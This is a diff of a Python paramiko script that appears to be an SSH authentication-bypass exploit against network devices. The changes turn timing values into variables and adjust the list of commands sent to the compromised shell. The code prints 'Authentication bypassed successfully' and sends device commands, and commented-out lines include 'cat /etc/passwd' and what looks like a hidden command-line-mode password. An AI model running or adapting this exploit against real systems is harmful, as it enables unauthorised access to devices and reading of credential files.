@@ -1,6 +1,10 @@
-import paramiko, argparse, time, socket, os, platform, logging
+import paramiko, argparse, time, socket, os, platform
+# import logging
 #logging.getLogger("paramiko").setLevel(logging.WARNING)
 #paramiko.util.log_to_file("paramiko_log_file", level = "DEBUG")
+command_delay=0.3
+console_wait=0.5
+output_wait=1
 
 command_list = []
 
@@ -16,17 +20,22 @@ command_list = []
 # command_list.append("pwd\n")
 # command_list.append("cat /etc/passwd\n")
 
+# command_list.append("_cmdline-mode on\n")
+# command_list.append("Y\n")
+# command_list.append("512900\n")
+# command_list.append("rmdir enes0412deneme\n")
+# command_list.append("Y\n")
+# command_list.append("dir\n")
+
+command_list.append("pwd\n")
 command_list.append("show sessions\n")
-# command_list.append("pwd\n")
-# command_list.append("\n")
-# command_list.append("\n")
-# command_list.append("dir\n")
-# command_list.append("cd system\n")
-# command_list.append("dir\n")
-# command_list.append("pwd\n")
-# command_list.append("show interfaces counter GigabitEthernet 1\n")
-
-
+command_list.append("\n")
+command_list.append("\n")
+command_list.append("dir\n")
+command_list.append("cd system\n")
+command_list.append("dir\n")
+command_list.append("pwd\n")
+command_list.append("show interfaces counter GigabitEthernet 1\n")
 
 
 
@@ -155,10 +164,10 @@ def activate_shell(host,port,username,password,timeout):
 
 		for command in command_list:
 			rm.send(command)
-			time.sleep(0.3)
+			time.sleep(command_delay)
 
 
-		time.sleep(1)
+		time.sleep(output_wait)
 		output = str(rm.recv(131989504))
 		output=output.replace("\\r\\n", "\n")[2:]
 		output=output[0:len(output)-1]
@@ -181,17 +190,17 @@ def activate_shell(host,port,username,password,timeout):
 					print(paint("[+] ","GREEN") + "Authentication bypassed successfully, again.")
 					print(paint("[*] ","BLUE") + "Invoking the shell...")
 					rm=ssh.invoke_shell()
-					time.sleep(0.5)
+					time.sleep(console_wait)
 					rm.send(username+"\n")
-					time.sleep(0.5)
+					time.sleep(command_delay)
 					rm.send(password+"\n")
-					time.sleep(0.8)
+					time.sleep(console_wait)
 
 					for command in command_list:
 						rm.send(command)
-						time.sleep(0.3)
+						time.sleep(command_delay)
 
-					time.sleep(1)
+					time.sleep(output_wait)
 
 					output = str(rm.recv(131989504))
 					output=output.replace("\\r\\n", "\n")[2:]
